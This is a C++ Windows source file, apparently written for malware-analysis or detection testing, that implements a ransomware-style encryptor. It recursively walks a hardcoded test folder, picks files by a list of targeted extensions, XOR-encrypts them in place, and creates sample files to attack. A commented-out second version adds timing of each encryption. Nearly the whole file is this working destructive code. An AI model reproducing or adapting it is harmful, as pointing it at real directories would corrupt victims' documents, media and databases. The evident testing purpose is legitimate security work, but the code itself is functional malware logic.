#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <algorithm>

// Encryption key (in a real scenario, this would be more sophisticated)
const char* ENCRYPTION_KEY = "MySecretKey123";

// List of file extensions to target for encryption
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".docx", ".xlsx", ".db", ".pdf", ".jpg", ".png", ".gif",
    ".mp4", ".avi", ".mov", ".mp3", ".wav", ".exe", ".dll", ".sys"
};

// List of extensions to skip (system/critical files)
const std::vector<std::string> SKIP_EXTENSIONS = {
    ".sys", ".dll", ".exe", ".ocx", ".cpl", ".drv", ".vxd", ".bin",
    ".msi", ".msp", ".mst", ".scr", ".bat", ".cmd", ".com", ".js",
    ".vbs", ".wsh", ".wsf", ".hta", ".lnk", ".pif"
};

// Function to check if a file extension is in our target list
bool IsTargetFile(const std::string& filename) {
    size_t dotPos = filename.find_last_of('.');
    if (dotPos == std::string::npos) return false;

    std::string ext = filename.substr(dotPos);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    // Check if extension is in target list
    for (const auto& targetExt : TARGET_EXTENSIONS) {
        if (ext == targetExt) {
            return true;
        }
    }
    return false;
}

// Function to check if a file extension should be skipped
bool ShouldSkipFile(const std::string& filename) {
    size_t dotPos = filename.find_last_of('.');
    if (dotPos == std::string::npos) return false;

    std::string ext = filename.substr(dotPos);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    // Check if extension is in skip list
    for (const auto& skipExt : SKIP_EXTENSIONS) {
        if (ext == skipExt) {
            return true;
        }
    }
    return false;
}

// Simple XOR encryption function
void EncryptFile(const std::string& filename) {
    HANDLE hFile = CreateFileA(
        filename.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        CloseHandle(hFile);
        return;
    }

    // Read file content
    std::vector<BYTE> buffer(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        return;
    }

    // Encrypt data using XOR with key
    for (DWORD i = 0; i < fileSize; i++) {
        buffer[i] ^= ENCRYPTION_KEY[i % strlen(ENCRYPTION_KEY)];
    }

    // Write encrypted data back to file
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, NULL);

    CloseHandle(hFile);
}

// Function to enumerate and encrypt files in a directory
void EncryptTargetFiles(const std::string& directoryPath) {
    std::string searchPath = directoryPath + "\\*.*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        // Skip directories and system files
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip current and parent directory entries
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                // Recursively process subdirectories if needed
                std::string subDirPath = directoryPath + "\\" + findData.cFileName;
                EncryptTargetFiles(subDirPath);
            }
        }
        else {
            // Process files
            std::string filename = findData.cFileName;

            // Skip system files and hidden files
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) {
                continue;
            }

            if (ShouldSkipFile(filename)) {
                continue;
            }

            if (IsTargetFile(filename)) {
                std::string fullPath = directoryPath + "\\" + filename;

                // Only encrypt if not already encrypted
                if (filename.find("[ENCRYPTED]") == std::string::npos) {
                    try {
                        EncryptFile(fullPath);
                        std::cout << "[+] Encrypted file: " << fullPath << std::endl;
                    }
                    catch (...) {
                        std::cout << "[-] Failed to encrypt file: " << fullPath << std::endl;
                    }
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

// Function to create sample files for testing
void CreateTestFiles(const std::string& directoryPath) {
    // Create some test files with sample content
    std::vector<std::pair<std::string, std::string>> testFiles = {
        {"test.txt", "This is a test text file.\n"},
        {"data.xlsx", "Sample Excel data\n"},
        {"database.db", "SQLite database content\n"},
        {"document.docx", "Word document content\n"}
    };

    for (const auto& file : testFiles) {
        std::string fullPath = directoryPath + "\\" + file.first;
        HANDLE hFile = CreateFileA(
            fullPath.c_str(),
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            WriteFile(hFile, file.second.c_str(), file.second.length(), &bytesWritten, NULL);
            CloseHandle(hFile);
        }
    }
}

int main() {
    std::string value;

    // Define the target directory for encryption
    std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

    // Create test files for demonstration (only if directory exists)
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(targetDirectory.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
        CreateTestFiles(targetDirectory);
    }

    while (true) {
        // Output the current process Id
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: ";
        std::cout << GetProcessIdOfThread(currentThread);
        std::cout << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
        std::getline(std::cin, value);

        Beep(500, 500); // Beep with frequency 500Hz for 500ms

        std::cout << "[*] Performing file encryption...\n";
        EncryptTargetFiles(targetDirectory);
        std::cout << "[*] Encryption completed.\n";
    }

    return 0;
}



/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <algorithm>
#include <chrono>

const char* ENCRYPTION_KEY = "MySecretKey123";

const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".docx", ".xlsx", ".db", ".pdf", ".jpg", ".png", ".gif",
    ".mp4", ".avi", ".mov", ".mp3", ".wav", ".exe", ".dll", ".sys"
};

const std::vector<std::string> SKIP_EXTENSIONS = {
    ".sys", ".dll", ".exe", ".ocx", ".cpl", ".drv", ".vxd", ".bin",
    ".msi", ".msp", ".mst", ".scr", ".bat", ".cmd", ".com", ".js",
    ".vbs", ".wsh", ".wsf", ".hta", ".lnk", ".pif"
};

bool IsTargetFile(const std::string& filename) {
    size_t dotPos = filename.find_last_of('.');
    if (dotPos == std::string::npos) return false;

    std::string ext = filename.substr(dotPos);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    for (const auto& targetExt : TARGET_EXTENSIONS) {
        if (ext == targetExt) {
            return true;
        }
    }
    return false;
}

bool ShouldSkipFile(const std::string& filename) {
    size_t dotPos = filename.find_last_of('.');
    if (dotPos == std::string::npos) return false;

    std::string ext = filename.substr(dotPos);
    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

    for (const auto& skipExt : SKIP_EXTENSIONS) {
        if (ext == skipExt) {
            return true;
        }
    }
    return false;
}

bool EncryptFile(const std::string& filename, double& durationMicroseconds) {
    auto start = std::chrono::high_resolution_clock::now();

    HANDLE hFile = CreateFileA(
        filename.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        auto end = std::chrono::high_resolution_clock::now();
        durationMicroseconds = std::chrono::duration<double, std::micro>(end - start).count();
        std::cerr << "[-] Failed to open: " << filename << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0) {
        CloseHandle(hFile);
        auto end = std::chrono::high_resolution_clock::now();
        durationMicroseconds = std::chrono::duration<double, std::micro>(end - start).count();
        std::cerr << "[-] Empty file: " << filename << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return false;
    }

    std::vector<BYTE> buffer(fileSize);
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        auto end = std::chrono::high_resolution_clock::now();
        durationMicroseconds = std::chrono::duration<double, std::micro>(end - start).count();
        std::cerr << "[-] Read failed: " << filename << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return false;
    }

    for (DWORD i = 0; i < fileSize; i++) {
        buffer[i] ^= ENCRYPTION_KEY[i % strlen(ENCRYPTION_KEY)];
    }

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, NULL);

    CloseHandle(hFile);

    auto end = std::chrono::high_resolution_clock::now();
    durationMicroseconds = std::chrono::duration<double, std::micro>(end - start).count();

    if (bytesWritten == fileSize) {
        std::cout << "[+] Encrypted: " << filename << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return true;
    }
    else {
        std::cerr << "[-] Write failed: " << filename << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return false;
    }
}

void EncryptTargetFiles(const std::string& directoryPath) {
    auto globalStart = std::chrono::high_resolution_clock::now();

    std::string searchPath = directoryPath + "\\*.*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        auto globalEnd = std::chrono::high_resolution_clock::now();
        double durationMicroseconds = std::chrono::duration<double, std::micro>(globalEnd - globalStart).count();
        std::cerr << "[-] No files found in: " << directoryPath << " (Time: " << durationMicroseconds << " µs)" << std::endl;
        return;
    }

    int fileCount = 0;
    double totalMicroseconds = 0.0;

    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                std::string subDir = directoryPath + "\\" + findData.cFileName;
                EncryptTargetFiles(subDir);
            }
        }
        else {
            std::string filename = findData.cFileName;
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) continue;
            if (ShouldSkipFile(filename)) continue;
            if (IsTargetFile(filename) && filename.find("[ENCRYPTED]") == std::string::npos) {
                std::string fullPath = directoryPath + "\\" + filename;
                double fileTime = 0.0;
                if (EncryptFile(fullPath, fileTime)) {
                    totalMicroseconds += fileTime;
                    fileCount++;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    auto globalEnd = std::chrono::high_resolution_clock::now();
    double totalScanTime = std::chrono::duration<double, std::micro>(globalEnd - globalStart).count();

    if (fileCount > 0) {
        std::cout << "[*] Total files encrypted: " << fileCount << std::endl;
        std::cout << "[*] Total encryption time: " << totalMicroseconds << " µs" << std::endl;
        std::cout << "[*] Average time per file: " << (totalMicroseconds / fileCount) << " µs" << std::endl;
        std::cout << "[*] Total scan + encrypt time: " << totalScanTime << " µs\n";
    }
    else {
        std::cout << "[!] No target files found for encryption.\n";
        std::cout << "[*] Total scan time (no encryption): " << totalScanTime << " µs\n";
    }
}

void CreateTestFiles(const std::string& directoryPath) {
    std::vector<std::pair<std::string, std::string>> testFiles = {
        {"test.txt", "This is a test text file.\n"},
        {"data.xlsx", "Sample Excel data\n"},
        {"database.db", "SQLite database content\n"},
        {"document.docx", "Word document content\n"}
    };

    for (const auto& file : testFiles) {
        std::string fullPath = directoryPath + "\\" + file.first;
        HANDLE hFile = CreateFileA(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            WriteFile(hFile, file.second.c_str(), file.second.length(), &bytesWritten, NULL);
            CloseHandle(hFile);
        }
    }
}

int main() {
    std::string value;
    std::string targetDirectory = "C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(targetDirectory.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
        CreateTestFiles(targetDirectory);
    }

    while (true) {
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep & Encrypt files (Ctrl-C to exit): ";
        std::getline(std::cin, value);

        Beep(500, 500);

        std::cout << "[*] Performing file encryption...\n";
        EncryptTargetFiles(targetDirectory);
        std::cout << "[*] Encryption process completed.\n\n";
    }

    return 0;
}
*/